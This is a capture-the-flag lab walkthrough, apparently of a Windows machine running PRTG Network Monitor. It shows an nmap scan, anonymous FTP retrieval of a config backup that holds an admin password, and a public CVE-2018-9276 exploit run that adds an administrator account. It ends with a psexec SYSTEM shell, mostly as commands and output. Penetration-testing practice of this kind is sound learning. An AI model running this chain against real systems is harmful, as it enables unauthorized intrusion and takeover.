nmap
```
$ sudo nmap -sC -sV 10.10.10.152

Nmap scan report for 10.10.10.152
Host is up (0.033s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
```

exploit: manual
```
$ ftp 10.10.10.152

#https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data

ftp> cd ProgramData\\Paessler\\"PRTG Network Monitor"

ftp> get "PRTG Configuration.old.bak"
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1153755 bytes received in 0.63 secs (1.7405 MB/s)

$ cat 'PRTG Configuration.old.bak' 

<snip>
		<dbpassword>
            <!-- User: prtgadmin -->
            PrTg@dmin2018
        </dbpassword>
<snip>

#login

$ searchsploit prtg network monitor
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution           | windows/webapps/46527.sh
PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                          | windows/webapps/49156.txt
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)       | windows_x86/dos/44500.py
------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

$ seachsploit -m windows/webapps/46527.sh

#get cookies

$ bash 46527.sh -u http://10.10.10.152 -c "_ga=GA1.4.739500643.1625820975; _gid=GA1.4.955393895.1625820975; OCTOPUS1813713946=ezBENjlBRkVFLTU1RDEtNDg0Mi1COTAzLTQ5MEVCNDAwRDc2M30%3D; _gat=1"

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.                                                                                                         
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!'             

[+]#########################################################################[+] 

 [*] file created 
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st' 
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group 
 [*] sending notification wait....


 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 

$ python3 /opt/impacket/examples/psexec.py pentest@10.10.10.152

Impacket v0.9.24.dev1+20210611.72516.1a5ed9dc - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file RplEfVnU.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service ZpvI on 10.10.10.152.....
[*] Starting service ZpvI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```